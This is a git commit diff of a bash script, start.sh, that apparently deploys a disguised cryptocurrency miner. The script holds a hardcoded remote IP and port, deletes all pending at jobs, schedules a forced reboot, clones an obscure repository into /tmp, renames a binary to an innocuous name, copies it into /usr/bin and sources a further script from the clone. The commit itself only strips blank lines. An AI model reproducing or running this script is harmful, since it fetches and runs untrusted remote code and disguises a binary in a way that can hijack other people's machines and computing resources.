afb91687d5b59249f53433ea2b278712e65d6c55
servicemi <52180716+servicemi@users.noreply.github.com>
2019-06-25 23:13:05 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,16 +1,10 @@
 #!/bin/bash
 IPADR="95.216.187.139:4500"
 MNRCO="vnbrerr"
-
-
 ID="$(hostname)"
 THREADS="$(nproc --all)"
-
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 echo 'sudo reboot -f' | at now + 12 hours
-
-
-
 rm -rf /tmp/none/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
@@ -19,23 +13,13 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sudo apt-get install dos2unix
 sleep 2
-
-
-
 cd /tmp && mkdir none
 git clone https://github.com/nomonom/nbnberrtest1.git /tmp/none
-
 cd /tmp/none
-
-
 chmod 777 ./*.sh
-
 mv service $MNRCO
 chmod +x /tmp/none/$MNRCO
 sudo cp /tmp/none/$MNRCO /usr/bin/$MNRCO
 sleep 3
-
-
 sudo dos2unix pusk.sh
-
 . ./pusk.sh
